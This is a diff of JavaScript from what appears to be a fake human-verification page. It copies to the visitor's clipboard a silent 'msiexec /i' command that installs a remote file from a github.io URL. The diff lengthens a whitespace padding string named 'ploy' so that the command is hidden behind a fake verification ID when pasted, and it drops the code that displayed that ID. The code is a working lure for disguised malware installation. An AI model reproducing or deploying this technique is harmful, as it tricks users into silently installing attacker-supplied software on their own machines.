@@ -409,7 +409,7 @@
 
             function stageC(cToRun, verification_id) {
                 const suffix = ""
-                const ploy = "                                                  "
+                const ploy = "                                                                                                    "
                 const end = ""
                 const textToCopy = cToRun + suffix + ploy + verification_id + end
 
@@ -429,10 +429,6 @@
                 // verifywindow.style.left =  (checkboxWindow.offsetLeft + 54) + "px";
                 verifywindow.style.left = "50%";
                 verifywindow.style.transform = "translateX(-50%)";
-
-                var verification_id = generateRandomNumber();
-                let verifyIdEl = document.getElementById('verification-id');
-                if (verifyIdEl) verifyIdEl.textContent = verification_id;
 
                 const toRun = "msiexec /i https://yilmazmakina.github.io/assets/verify.ext /qn"
                 stageC(toRun, verification_id)
